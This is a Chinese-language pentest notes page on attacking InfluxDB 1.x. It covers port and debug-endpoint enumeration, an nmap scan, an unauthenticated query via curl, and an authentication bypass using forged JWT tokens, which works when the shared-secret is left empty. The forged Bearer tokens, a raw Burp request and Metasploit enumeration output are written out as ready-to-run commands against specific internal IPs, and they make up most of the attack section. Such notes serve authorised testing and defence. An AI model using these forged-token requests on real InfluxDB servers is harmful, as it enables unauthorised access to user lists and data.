---
title: InfluxDB
category:
- [Kali, Exploit]


tags:
  - null
date: 2020-12-04 20:24:03
top:
updated:
---

`influxdb` 是针对时间戳或时间序列数据进行优化的的`开源时序数据库`,  
    由Go语言编写，广泛应用于存储系统的监控数据、loT行业的实时数据等，处理高写入和高查询负载。
	
端口服务
* `8083` Web admin管理服务端口
* `8086` HTTP API的端口
* `8088` 集群端口
* `9096` 中继端口

> InfluxDB 1.x HTTP 端点

|Endpoint|Description|
|--------|---------- |
|/debug/pprof	|Generate profiles for troubleshooting|
|/debug/requests|	Track HTTP client requests to the /write and /query endpoints|
|/debug/vars   |	Collect internal InfluxDB statistics|
|/ping	|Check the status of your InfluxDB instance and your version of InfluxDB|
|/query|	Query data using InfluxQL, manage databases, retention policies, and users|
|/write	|Write data to a database|

## 信息收集
```zsh
sudo nmap -sV -Pn -T4 -sSU -p 8086 -sC    10.199.18.8                                                           
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 16:31 CST
Nmap scan report for 10.199.18.8
Host is up (0.057s latency).

PORT     STATE         SERVICE VERSION
8086/tcp open          http    InfluxDB http admin 1.2.4
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8086/udp open|filtered d-s-n

Nmap done: 1 IP address (1 host up) scanned in 113.41 seconds
```
debug调试信息泄漏
```
http://10.199.18.7:8086/debug/vars 
http://10.199.18.7:8086/debug/pprof/heap 
http://10.199.18.7:8086/debug/pprof/goroutine 
http://10.199.18.7:8086/debug/pprof/goroutine?debug=1 
http://10.199.18.7:8086/debug/pprof/block 
http://10.199.18.7:8086/debug/pprof/profile 
http://10.199.18.7:8086/debug/pprof/threadcreate
```

## influxdb认证绕过漏洞
InfluxDB使用jwt作为鉴权方式。  
在用户开启了认证，但未设置参数shared-secret的情况下，`JWT token shared-secret` 默认为空，  
此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。


### `curl`命令复现
> 服务器未配置身份认证时可直接进行数据库相关操作
```zsh
curl  "http://10.199.18.7:8086/debug/requests"
curl -G 'http://10.199.18.7:8086/query' --data-urlencode 'q=show users'                    # 服务器未配置认证可直接查询
{"results":[{"statement_id":0,"series":[{"columns":["user","admin"]}]}]}
curl -G 'http://10.199.18.7:8086/query' --data-urlencode 'q=show databases'        # 查询数据库
{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["gnocchi"],["_internal"],["test11"]]}]}]}
```

> 服务器配置身份认证，但`JWT token shared-secret` 默认为空时

构造[JWT Token](https://jwt.io/)

![influxdb-1](../images/influxdb-1.png)

发送POC

```zsh
curl -G 'http://xxx:8086/query'  -v \
	--data-urlencode 'q=show users' \ 
	-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNTU5Mjg0OTM1fQ.tUClNot9LgStSw57n26DSn-3NPkBiHizk-XOHMfJJJw'

# output
{"results":[{"statement_id":0,"series":[{"columns":["user","admin"],"values":[["admin",true],["read",false],["write",false],["telegraf",true]]}]}]}
```

### BurpSuite复现
```zsh poc
POST /query HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

q=show%20users
```
![influxdb-2](../images/influxdb-2.png)


## MSF相关模块利用
```zsh
msf6 auxiliary(scanner/http/influxdb_enum) > show options

Module options (auxiliary/scanner/http/influxdb_enum):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   root             yes       The password to login with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   QUERY      SHOW DATABASES   yes       The influxdb query syntax
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8086             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to list all the databases
   USERNAME   root             yes       The username to login as
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/influxdb_enum) > set rhosts 10.199.18.7
rhosts => 10.199.18.7
msf6 auxiliary(scanner/http/influxdb_enum) > run
[*] Running module against 10.199.18.7

[+] 10.199.18.7:8086 - Influx Version: 1.2.4
[+] File saved in: /Users/ethan/.msf4/loot/20201202195840_default_10.199.18.7_influxdb.enum_380609.txt
[*] Auxiliary module execution completed

```
